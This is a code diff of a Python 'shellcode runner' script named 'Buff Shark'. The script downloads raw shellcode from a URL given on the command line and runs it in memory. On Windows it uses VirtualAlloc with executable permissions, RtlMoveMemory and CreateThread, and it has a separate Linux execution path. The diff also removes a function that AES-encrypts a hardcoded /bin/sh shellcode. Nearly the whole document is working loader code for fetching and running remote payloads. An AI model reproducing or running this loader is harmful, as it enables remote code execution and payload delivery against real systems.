@@ -11,18 +11,6 @@ import urllib.request
 
 
 
-print("==========================")
-print("Buff Shark Shellcode Runner")
-print(" Author: Momo Nguyen ")
-print("==========================")
-
-parser = argparse.ArgumentParser(description="Python Shellcode Runner")
-parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to raw shellcode file")
-parser.add_argument('-a', '--architecture', metavar='', required=True, help="Choose OS", choices=['win', 'nix'])
-args = parser.parse_args()
-
-
-
 def downloader(shellcode_url):
     with urllib.request.urlopen(shellcode_url) as f:
         print("[+] Downloading shellcode...")
@@ -54,59 +42,52 @@ def write_linux(str1):
     time.sleep(2)
     fn()
 
-def write(buf):
-    length = len(buf)
+
+
+
+def run(shellcode):
     kernel32 = ctypes.windll.kernel32
+    length = len(shellcode)
+
+    time.sleep(1)
+
+    print("[+] Running shellcode in memory...")
 
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
 
-    kernel32.RtlMoveMemory.argtypes = (
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_size_t)
+    buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
+
+    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
     kernel32.RtlMoveMemory(ptr, buf, length)
-    return ptr
 
-
-def run(shellcode):
-    buf = ctypes.create_string_buffer(b"" + shellcode)
-    time.sleep(1)
-    print("[+] Running shellcode in memory...")
-    ptr = write(buf)
-    shell_func = ctypes.CFUNCTYPE(ctypes.c_void_p)
-    fn = shell_func(ptr)
     time.sleep(2)
-    fn()
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+    ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
     
-
-
-
-
-def encrypt():
-    key = ('0123456789abcdef0123456789abcdef').encode()
-    counter = pyaes.Counter(initial_value = 100)
-    aes = pyaes.AESModeOfOperationCTR(key, counter = counter)
-    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-    coded = aes.encrypt(shellcode)
-    final_shellcode = ""
-    for x in coded:
-        final_shellcode += '\\x'
-        final_shellcode += '%02x' % x
-
-
-    print("[+] Encrypted shellcode: %s" % (final_shellcode))
-    print("[+] Use this as shellcode %s" % (final_shellcode.replace('\\x', '')))
 
 
 
 
 
 if __name__ == "__main__":
-    if args.architecture == 'win':
+    print("=" * 26)
+    print("Buff Shark Shellcode Runner")
+    print(" Author: Momo Nguyen ")
+    print("=" * 26)
+
+    parser = argparse.ArgumentParser(description="Python Shellcode Runner")
+    parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to raw shellcode file")
+    parser.add_argument('-a', '--os', metavar='', required=True, help="Choose OS: win/nix", choices=['win', 'nix'])
+    args = parser.parse_args()
+
+
+
+    if args.os == 'win':
         str1 = downloader(args.url)
         run(str1)
-    elif args.architecture == 'nix':
+    elif args.os == 'nix':
         str1 = downloader(args.url)
         write_linux(str1)
 
